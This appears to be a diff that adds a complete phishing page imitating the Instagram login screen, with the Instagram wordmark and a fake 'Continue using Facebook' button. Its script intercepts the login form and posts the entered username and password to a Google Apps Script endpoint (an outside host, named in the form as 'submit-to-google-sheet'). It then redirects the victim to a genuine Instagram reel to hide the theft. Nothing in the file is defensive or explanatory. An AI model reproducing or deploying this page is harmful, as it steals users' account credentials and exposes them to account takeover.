@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body {
+            background-color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: #fff;
+            
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .login-box img {
+            margin: 20px 0;
+            width: 175px;
+        }
+
+        .input-container {
+            margin-top: 20px;
+        }
+
+        .input-field {
+            width: 70%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            width: 70%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+
+        .or {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .or::before, .or::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .or:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .or:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .fb-login {
+            width: 70%;
+            margin-left: 15%;
+            display: flex;
+            height: 25px;
+            align-items: center;
+            justify-content: center;
+            background-color: #0095f6;
+            color: white;
+            font-weight: bold;
+            margin-bottom: 20px; /* Adjust margin to move button up */
+            padding: 5px; /* Increased padding for height */
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .fb-login img {
+            margin-right: 8px;
+            width: 24px; /* Adjust the width as needed */
+        }
+
+        .forgot-password {
+            color: #00376b;
+            margin-top: 20px;
+            font-size: 12px;
+            cursor: pointer;
+            padding-bottom: 20px;
+            margin-top: 5px;
+        }
+
+        .signup-box {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+    </style>
+</head>
+<body>
+  <form name="submit-to-google-sheet">
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            <div class="fb-login">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoHhnJOf_YXmS_Y3gRY_oziUc6rTq2_YEiEr7EZcj8Y2I7hBhD_UJO_G_JXgioNNtG9JloTfDbAvQL6Eib-NLgYm05d867Leto5hOhsexuLJ3mbh0ax9AQ41hySH4lX5uq_w4QYAtzvxs/s1600/f_logo_RGB-Blue_1024.png" alt="Facebook">
+                <span>Continue using Facebook</span>
+            </div>
+            <div class="or">OR</div>
+            <div class="input-container">
+                <input type="text" name="userid" class="input-field" placeholder="Phone number, username, or email">
+                <input type="password" name="pw" class="input-field" placeholder="Password">
+                <div class="forgot-password">Forgot password?</div> <!-- Moved here -->
+                <button class="login-btn" type="submit" name="submit">Log In</button>
+            </div>
+            <div class="signup-box">
+                <p>Don't have an account? <span class="signup-link">Sign up</span></p>
+            </div>
+        </div>
+    </div>
+</form>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzKAaidXCrEgE5g-WjAXDCUbWzZFPiUOigU4Ak5ISFP6T6-gsU9gbzVX_xdhVgpWsLb/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+                    console.log('Success!', response);
+                    window.location.href = 'https://www.instagram.com/reel/CekLx5tpQ2_/?igshid=cjNid3VpZG0yMjE='; // Replace with your desired URL
+                })
+
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
+</body>
+</html>
